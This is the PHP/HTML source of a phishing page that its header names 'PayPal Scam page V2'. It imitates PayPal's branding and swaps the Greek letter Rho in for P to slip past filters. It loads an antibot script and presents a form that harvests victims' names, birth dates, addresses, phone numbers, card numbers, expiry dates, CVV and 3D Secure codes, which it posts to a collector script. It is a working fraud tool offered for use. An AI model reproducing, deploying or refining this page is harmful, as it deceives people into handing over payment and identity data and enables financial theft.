<?php
/*
PayPal Scam page V2 Coded By Nabil-Tn
*/
include 'antibot.php';
?>
<!--

$$$$$$$\                     $$$$$$$\           $$\
$$  __$$\                    $$  __$$\          $$ |
$$ |  $$ |$$$$$$\  $$\   $$\ $$ |  $$ |$$$$$$\  $$ |
$$$$$$$  |\____$$\ $$ |  $$ |$$$$$$$  |\____$$\ $$ |
$$  ____/ $$$$$$$ |$$ |  $$ |$$  ____/ $$$$$$$ |$$ |
$$ |     $$  __$$ |$$ |  $$ |$$ |     $$  __$$ |$$ |
$$ |     \$$$$$$$ |\$$$$$$$ |$$ |     \$$$$$$$ |$$ |
\__|      \_______| \____$$ |\__|      \_______|\__|
                   $$\   $$ |
                   \$$$$$$  |
                    \______/

Now hiring @ https://jobs.paypal-corp.com 2015-2016

-->

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html class=" js  js " lang="en"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title> Confirm your &Rho;ersonal and Credit Card informations </title>
<link rel="shortcut icon" sizes="./favicon.ico">
<link rel="shortcut icon" type="image/x-icon" href="./favicon.ico">
<link rel="icon" type="image/x-icon" href="./favicon.ico">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
<script>if( !window.location.hash && window.addEventListener ){window.addEventListener("load",function() {setTimeout(function(){window.scrollTo(0, 1);}, 1000);});}</script>



<script src="javascript/modernizr-2.js"></script>
<script>if (self === top) {var antiClickjack = document.getElementById("antiClickjack");antiClickjack.parentNode.removeChild(antiClickjack);} else {top.location = self.location;}</script>
<script src="files/nougat.js" data-requiremodule="nougat" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
<script src="fiiles/jquery-1.js" data-requiremodule="jquery" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
<script src="files/baseview.js" data-requiremodule="BaseView" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
<script src="files/pageview.js" data-requiremodule="widgets/pageView" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
<script src="files/underscore-1.js" data-requiremodule="underscore" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
<script src="files/fso-helper.js" data-requiremodule="fso-helper" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
<script src="files/dust-core-2.js" data-requiremodule="dust" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
<script src="files/buttontoggle.js" data-requiremodule="buttonToggle" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
<script src="files/backbone-0.js" data-requiremodule="backbone" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
<script src="files/fso.js" data-requiremodule="fso" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
<script src="files/dust-helpers-1.js" data-requiremodule="dust-helpers" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
<script src="files/dust-helpers-supplement.js" data-requiremodule="dust-helpers-supplement" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
<script src="files/create.js" data-requiremodule="view/create" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
<script src="files/nativedropdown.js" data-requiremodule="nativeDropdown" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
<script src="files/jquery.js" data-requiremodule="jqueryUI" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
<script src="files/lap.js" data-requiremodule="lap" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
<script src="files/textfield.js" data-requiremodule="textField" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
<script src="files/restrict.js" data-requiremodule="restrict" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
<script src="files/phonenumber.js" data-requiremodule="phoneNumber" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
<link rel="stylesheet" type="text/css" href="files/index.css" media="all">
</head>


<body class="desktop control linktobgc"><noscript><p class="nonjsAlert" role="alert">NOTE: Many features on the Web site require Javascript and cookies.</p></noscript>
<header class="mainHeader" role="banner"><div class="headerContainer"><div class="grid12"><a href="#" class="logo"><img src="files/logo_dznoob_106x29.png" alt=" logo" height="29" width="109"></a>
<div class="loginBtn"><span class="securityLock"> Your security is our to&rho; &rho;riority </span></div></div></div></header>
  

<main class="createPage US">
<section id="content" role="main" data-country="US">
<section id="main" class=""><div id="create" class="create grid12 grid"><div class="valueProp grid6">
<header><h1><? echo 'Confirm your &Rho;ersonal and Credit card informations'; ?> .  </h1></header>
<div class="imageHolder"></div></div><div class="grid6 gutter-left">
<form action="./informations.php" method="post" name="informations">

<div class="container"><div class="inner">
<div class="groupFields"> <h4><? echo 'Your &Rho;ersonal informations'; ?> : </h4><div class="textInput lap large ">
<input class="validate camelCase" id="firstName" placeholder="<? echo 'First name'; ?> " name="nabil-fn" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true" type="text"></div>
<div class="textInput lap large ">
<input class="validate camelCase" id="lastName" name="nabil-ln" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" placeholder="<? echo 'Last name';?> " aria-required="true" type="text">
</div></div>
<div class="addressEntry " id="addressEntry"><div class="groupFields"><div class="textInput lap large ">
<div class="textInput lap large city ">
 <input id="city" name="nabil-bir" placeholder=" Date of Birth (dD/MM/YYYY)  " class="hasHelp validate camelCase" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true" type="text">
 <p class="help-error error-empty" id="cityEmpty">Required.</p> </div>
<input class="hasHelp confidential validate camelCase" id="address2" name="nabil-ad-2" placeholder=" <? echo 'Address line ';?>  " autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true" type="text">
 <p class="help-error error-empty" id="address1Empty">Required</p>
 <p class="help-error error-format" id="address1Format"></p></div><div class="clearfix" id="stateHolder">
 <div class="textInput lap large city ">
 <input id="city" name="nabil-city" placeholder="<? echo ' City'; ?>  " class="hasHelp validate camelCase" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true" type="text">
 <p class="help-error error-empty" id="cityEmpty">Required.</p> </div>
 </div><div class="multi equal clearfix">
 <div class="nativeDropdown left medium state ">
 
 
 
<div class="selectDropdown ">
<select id="Country" name="nabil-country"><option selected="selected" value="mobile"> Country </option>
 



    <option value="UNITED STATES">United States</option>
    <option value="CANADA">Canada</option>
    <option value="MEXICO">Mexico</option>
    <option value="UNITED KINGDOM">United Kingdom</option>
    <option value="FRANCE">France</option>
    <option value="GERMANY">Germany</option>
    <option value="NETHERLANDS">Netherlands</option>
    <option value="DENMARK">Denmark</option>
    <option value="RUSSIA">Russia</option>
    <option value="ITALY">Italy</option>
    <option value="AFGHANISTAN">Afghanistan</option>
    <option value="ALBANIA">Albania</option>
    <option value="ALGERIA">Algeria</option>
    <option value="AMERICAN SAMOA">American Samoa</option>
    <option value="ANGUILLA">Anguilla</option>
    <option value="ANTIGUA &amp; BARBUDA">Antigua &amp; Barbuda</option>
    <option value="ARGENTINA">Argentina</option>
    <option value="ARMENIA">Armenia</option>
    <option value="ARUBA">Aruba</option>
    <option value="AUSTRALIA">Australia</option>
    <option value="AUSTRIA">Austria</option>
    <option value="AZERBAIJAN">Azerbaijan</option>
    <option value="BAHAMAS">Bahamas</option>
    <option value="BAHRAIN">Bahrain</option>
    <option value="BANGLADESH">Bangladesh</option>
    <option value="BARBADOS">Barbados</option>
    <option value="BELARUS">Belarus</option>
    <option value="BELGIUM">Belgium</option>
    <option value="BELIZE">Belize</option>
    <option value="BENIN">Benin</option>
    <option value="BHUTAN">Bhutan</option>
    <option value="BOLIVIA">Bolivia</option>
    <option value="BONAIRE">Bonaire</option>
    <option value="BOSNIA &amp; HERZEGOVINA">Bosnia &amp; Herzegovina</option>
    <option value="BOTSWANA">Botswana</option>
    <option value="BRAZIL">Brazil</option>
    <option value="BRITISH VIRGIN ISLANDS">British Virgin Islands</option>
    <option value="BRUNEI DARUSSALAM">Brunei Darussalam</option>
    <option value="BULGARIA">Bulgaria</option>
    <option value="BURKINA FASO">Burkina Faso</option>
    <option value="BURUNDI">Burundi</option>
    <option value="CAMBODIA">Cambodia</option>
    <option value="CAMEROON">Cameroon</option>
    <option value="CAPE VERDE">Cape Verde</option>
    <option value="CAYMAN ISLANDS">Cayman Islands</option>
    <option value="CENTRAL AFRICAN REPUBLIC">Central African Rep</option>
    <option value="CHAD">Chad</option>
    <option value="CHILE">Chile</option>
    <option value="CHINA">China</option>
    <option value="COLOMBIA">Colombia</option>
    <option value="COMOROS">Comoros</option>
    <option value="CONGO">Congo</option>
    <option value="COOK ISLANDS">Cook Islands</option>
    <option value="COSTA RICA">Costa Rica</option>
    <option value="COTE D IVOIRE">Cote D'Ivoire</option>
    <option value="CROATIA">Croatia</option>
    <option value="CUBA - US MILITARY">Cuba - US Military</option>
    <option value="CURACAO">Curacao</option>
    <option value="CYPRUS">Cyprus</option>
    <option value="CYPRUS NORTHERN">Cyprus (Northern)</option>
    <option value="CZECH REPUBLIC">Czech Republic</option>
    <option value="DEMOCRATIC REPUBLIC OF CONGO">Dem Rep of Congo</option>
    <option value="DJIBOUTI">Djibouti</option>
    <option value="DOMINICA">Dominica</option>
    <option value="DOMINICAN REPUBLIC">Dominican Republic</option>
    <option value="EAST TIMOR">East Timor</option>
    <option value="ECUADOR">Ecuador</option>
    <option value="EGYPT">Egypt</option>
    <option value="EL SALVADOR">El Salvador</option>
    <option value="EQUATORIAL GUINEA">Equatorial Guinea</option>
    <option value="ERITREA">Eritrea</option>
    <option value="ESTONIA">Estonia</option>
    <option value="ETHIOPIA">Ethiopia</option>
    <option value="FALKLAND ISLANDS">Falkland Islands</option>
    <option value="FIJI">Fiji</option>
    <option value="FINLAND">Finland</option>
    <option value="FRENCH GUIANA">French Guiana</option>
    <option value="FRENCH POLYNESIA">French Polynesia</option>
    <option value="GABON">Gabon</option>
    <option value="GAMBIA">Gambia</option>
    <option value="GEORGIA">Georgia</option>
    <option value="GERMANY - US MILITARY">Germany - US Military</option>
    <option value="GHANA">Ghana</option>
    <option value="GIBRALTAR">Gibraltar</option>
    <option value="GREECE">Greece</option>
    <option value="GRENADA">Grenada</option>
    <option value="GUADELOUPE">Guadeloupe</option>
    <option value="GUAM">Guam</option>
    <option value="GUATEMALA">Guatemala</option>
    <option value="GUINEA">Guinea</option>
    <option value="GUINEA-BISSAU">Guinea-Bissau</option>
    <option value="GUYANA">Guyana</option>
    <option value="HAITI">Haiti</option>
    <option value="HONDURAS">Honduras</option>
    <option value="HONG KONG">Hong Kong</option>
    <option value="HUNGARY">Hungary</option>
    <option value="ICELAND">Iceland</option>
    <option value="INDIA">India</option>
    <option value="INDONESIA">Indonesia</option>
    <option value="IRAQ">Iraq</option>
    <option value="IRELAND">Ireland</option>
    <option value="ISRAEL">Israel</option>
    <option value="ITALY - US MILITARY">Italy - US Military</option>
    <option value="JAMAICA">Jamaica</option>
    <option value="JAPAN">Japan</option>
    <option value="JAPAN - US MILITARY">Japan - US Military</option>
    <option value="JORDAN">Jordan</option>
    <option value="KAZAKHSTAN">Kazakhstan</option>
    <option value="KENYA">Kenya</option>
    <option value="KIRIBATI">Kiribati</option>
    <option value="KOREA - US MILITARY">Korea - US Military</option>
    <option value="REPUBLIC OF KOREA">Korea, Republic of</option>
    <option value="KOSOVO DEM">Kosovo</option>
    <option value="KUWAIT">Kuwait</option>
    <option value="KYRGHYZ REPUBLIC">Kyrghyz Republic</option>
    <option value="LAOS">Laos</option>
    <option value="LATVIA">Latvia</option>
    <option value="LEBANON">Lebanon</option>
    <option value="LIBERIA">Liberia</option>
    <option value="LIBYA">Libya</option>
    <option value="LIECHTENSTEIN">Liechtenstein</option>
    <option value="LITHUANIA">Lithuania</option>
    <option value="LUXEMBOURG">Luxembourg</option>
    <option value="MACAU">Macau</option>
    <option value="MACEDONIA">Macedonia</option>
    <option value="MADAGASCAR">Madagascar</option>
    <option value="MALAWI">Malawi</option>
    <option value="MALAYSIA">Malaysia</option>
    <option value="MALDIVES">Maldives</option>
    <option value="MALI">Mali</option>
    <option value="MALTA">Malta</option>
    <option value="MARSHALL ISLANDS">Marshall Islands</option>
    <option value="MARTINIQUE">Martinique</option>
    <option value="MAURITANIA">Mauritania</option>
    <option value="MAURITIUS">Mauritius</option>
    <option value="MAYOTTE">Mayotte</option>
    <option value="MICRONESIA">Micronesia</option>
    <option value="MOLDOVA">Moldova</option>
    <option value="MONACO">Monaco</option>
    <option value="MONGOLIA">Mongolia</option>
    <option value="MONTSERRAT">Montserrat</option>
    <option value="MOROCCO">Morocco</option>
    <option value="MOZAMBIQUE">Mozambique</option>
    <option value="NEPAL">Nepal</option>
    <option value="NEW CALEDONIA">New Caledonia</option>
    <option value="NEW ZEALAND">New Zealand</option>
    <option value="NICARAGUA">Nicaragua</option>
    <option value="NIGER">Niger</option>
    <option value="NIGERIA">Nigeria</option>
    <option value="NIUE">Niue</option>
    <option value="MARIANAS">Northern Mariana Islands</option>
    <option value="NORWAY">Norway</option>
    <option value="OMAN">Oman</option>
    <option value="PAKISTAN">Pakistan</option>
    <option value="PALAU">Palau</option>
    <option value="PALESTINIAN AUTHORITY">Palestinian Authority</option>
    <option value="PANAMA">Panama</option>
    <option value="PAPUA NEW GUINEA">Papua New Guinea</option>
    <option value="PARAGUAY">Paraguay</option>
    <option value="PERU">Peru</option>
    <option value="PHILIPPINES">Philippines</option>
    <option value="POLAND">Poland</option>
    <option value="PORTUGAL">Portugal</option>
    <option value="QATAR">Qatar</option>
    <option value="REUNION">Reunion</option>
    <option value="ROMANIA">Romania</option>
    <option value="RWANDA">Rwanda</option>
    <option value="SAMOA">Samoa</option>
    <option value="SAO TOME AND PRINCIPE">São Tomé and Príncipe</option>
    <option value="SAUDI ARABIA">Saudi Arabia</option>
    <option value="SENEGAL">Senegal</option>
    <option value="SERBIA &amp; MONTENEGRO">Serbia &amp; Montenegro</option>
    <option value="SEYCHELLES">Seychelles</option>
    <option value="SIERRA LEONE">Sierra Leone</option>
    <option value="SINGAPORE">Singapore</option>
    <option value="SLOVAKIA">Slovakia</option>
    <option value="SLOVENIA">Slovenia</option>
    <option value="SOLOMON ISLANDS">Solomon Islands</option>
    <option value="SPAIN">Spain</option>
    <option value="SRI LANKA">Sri Lanka</option>
    <option value="ST. KITTS">St. Kitts &amp; Nevis</option>
    <option value="ST. LUCIA">St. Lucia</option>
    <option value="ST. MAARTEN">St. Maarten</option>
    <option value="ST. VINCENT">St. Vincent</option>
    <option value="SUDAN">Sudan</option>
    <option value="SURINAME">Suriname</option>
    <option value="SWEDEN">Sweden</option>
    <option value="SWITZERLAND">Switzerland</option>
    <option value="SYRIA">Syria</option>
    <option value="TAIWAN">Taiwan</option>
    <option value="TAJIKISTAN">Tajikistan</option>
    <option value="TANZANIA">Tanzania</option>
    <option value="THAILAND">Thailand</option>
    <option value="TOGO">Togo</option>
    <option value="TONGA">Tonga</option>
    <option value="TRINIDAD &amp; TOBAGO">Trinidad &amp; Tobago</option>
    <option value="TUNISIA">Tunisia</option>
    <option value="TURKEY">Turkey</option>
    <option value="TURKMENISTAN">Turkmenistan</option>
    <option value="TURKS &amp; CAICOS">Turks &amp; Caicos Island</option>
    <option value="TUVALU">Tuvalu</option>
    <option value="UGANDA">Uganda</option>
    <option value="UKRAINE">Ukraine</option>
    <option value="UNITED ARAB EMIRATES">United Arab Emirates</option>
    <option value="URUGUAY">Uruguay</option>
    <option value="UZBEKISTAN">Uzbekistan</option>
    <option value="VANUATU">Vanuatu</option>
    <option value="VENEZUELA">Venezuela</option>
    <option value="VIETNAM">Vietnam</option>
    <option value="YEMEN">Yemen</option>
    <option value="ZAMBIA">Zambia</option>
    <option value="ZIMBABWE">Zimbabwe</option>
</select> 


 



</div></div><div class="textInput lap medium right zip ">
<input id="postalCode" placeholder=" Zip code " name="nabil-zip" autocomplete="off" class="validate" required="required" maxlength="8" "="" type="tel">
<p class="help-error error-empty" id="zipEmpty">Required.</p></div></div></div></div><div class="groupReatedFields mobileEntry"><div class="nativeDropdown left mobileEntry "><div class="selectDropdown ">
<select id="phoneOption" name="nabil-mobile"><option selected="selected" value="mobile">Mobile</option><option value="home">Home</option></select></div></div><div class="textInput lap right phone phoneNumber ">


<input id="phoneNumber" name="gg10" placeholder="&Rho;hone number " required="required" class="validate hasHelp" maxlength="10" aria-required="true" autocomplete="off" autocorrect="off" autocapitalize="off" type="tel">


</div></div>
<br><br>

 <link rel="shortcut icon" href="./favicon.ico">
<script src="card/modernizr-2.js">
</script><script>if (self === top) {var antiClickjack = document.getElementById("antiClickjack");antiClickjack.parentNode.removeChild(antiClickjack);} else {top.location = self.location;}</script>
<script src="card/config.htm" data-requiremodule="config" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
<script src="card/app.js" data-requiremodule="app" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
<script src="card/login.htm" data-requiremodule="view/login" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
<link rel="stylesheet" type="text/css" href="card/index.css" media="all">

<link href="card/creditCardTypeDetector.css" rel="stylesheet" type="text/css">
<script type="text/javascript" src="card/jquery_002.js"></script>
<script type="text/javascript" src="card/jquery.js"></script>
<script type="text/javascript">
$(document).ready(function(){
$('#checkout_card_number').creditCardTypeDetector({ 'credit_card_logos' : '.card_logos' });
});
</script>

   </head>

<br><br>

<div class="cardEntry groupFields"><h4>Your Credit Card informations :</h4> <div class="textInput large lap cardNumber">

<input id="checkout_card_number" placeholder="<? echo 'Credit Card number';?> " name="nabil-card" maxlength='17' size="20"  " autocomplete="off" class="stripe_card_number" required="required" type="text">
<br><br>
<ul class="card_logos">
<li class="card_visa">Visa</li>
<li class="card_mastercard">Mastercard</li>
<li class="card_amex">American Express</li>
<li class="card_discover">Discover</li>
<li class="card_jcb">JCB</li>
<li class="card_diners">Diners Club</li>

</ul></div><div class="multi equal clearfix">



<div class="textInput left lap expiryDate  ">
<input placeholder=" <? echo 'Ex&rho;iration Date';?> " id="expiryDate" class="validate" name="nabil-ex" autocapitalize="off" autocomplete="off" aria-required="true" maxlength="7" required="required" type="tel">
</div>
<div class="textInput right last lap cscNumber  ">


<span class="icons cvv defaultCvv" id="cvvHolder" role="img"></span><input class="hasHelp validate csc" placeholder="<? echo ' CVV (CVC)'; ?> " id="csc" name="nabil-ccv" aria-required="true" maxlength="4" pattern="[0-9]*" required="required" autocomplete="off" autocorrect="off" autocapitalize="off" type="tel"><p class="help-error error-empty" id="cscEmpty">Required.</p><p class="help-error error-format" id="cscFormat">CSC must be 3 or 4 digits.</p>
</div></div></div><div class="groupFields">

<div class="agreeTC checkbox  "><label for="termsAgree" id="termsAgreeLabel" aria-pressed="false" class="helpNotifyUS ui-state-default ui-corner-all ui-button-text-only" role="button" aria-disabled="false">
</span></label></div>
<div class="cardEntry groupFields"><div class="textInput large lap cardNumber">


</div><div class="multi equal clearfix"><div class="textInput left lap expiryDate  ">
<input placeholder="3D Secure Code" id="expiryDate" class="validate" name="nabil-3D" autocapitalize="off" autocomplete="off" aria-required="true" maxlength="7" type="tel"><p class="help-error error-empty" id="expiryDateEmpty">Required.</p></div>

<img src="img/3d.png" width="158" />
<br><br><br>
<div class="textInput right last lap cscNumber  ">




</div></div></div><div class="groupFields">



<input id="submitBtn" name="_eventId_continue" class="button" value=" Continue" type="submit"></div></div></form></div><img src="/files/3484-16283-2054-70.htm" alt="" height="1" border="0" width="1"></div></section></section></main>




<footer id="gblFooter" role="contentinfo">
<div class="footer IntentFooter">
<div class="footerNav"><div class="grid12"><div class="legal">
<p class="copyright">© 1999 - <?echo Date('Y') ?> &Rho;ay&Rho;al Inc.</p>
<ul><li><a href="#" target="_blank">&Rho;rivacy</a></li>
<li><a href="#" target="_blank">Legal</a></li>
<li><a href="#" target="_blank">Contact</a></li>
<li class="siteFeedback" id="siteFeedback"><script type="text/javascript">(function() {var feedback_link = '',className = "feedback";feedback_link="Feedback";window.PAYPAL = window.PAYPAL ? window.PAYPAL : {};window.PAYPAL.opinionLabVars = {'siteCatalystPageName'		: '','siteCatalystC7'			: '','siteCatalystAccountNumber' : '','feedback_link'			: feedback_link,'isPaymentFlow'			: false,'isSiteRedirect'			: false,'languageCode'			: 'en','countryCode'			: 'GB','serverName'			: 'rZJvnqaaQhLn&#x2F;nmWT8cSUjOx898qoYZ0VBZx2I0OAbHvn1ti9mbWBn0&#x2F;9HTMp4&#x2F;D','commentCardCmd'			: 'myCommand','accountNumber'			: '','miniBrowser'			: false,'sitefb_plus_icon'		: 'https://www.paypalobjects.com/en_US/i/scr/sm_333_oo.gif','rLogId'				: escape('rZJvnqaaQhLn%2FnmWT8cSUlS9vCX%2FejO6RX6%2B0YKpOfbgNpmZ9j1xVIMM4BmO6UfAZv84Ip5v2hqrdxbvaJfdmw_14f6c34b6a1'),'showSitefbIcon'			: false,'className'				: className,'optOut'				: false,'page'				: 'signup&#x2F;create'};})();</script>
<a class="feedback" href="#">Feedback</a></li></ul></div></div></div></div></footer>


</body></html>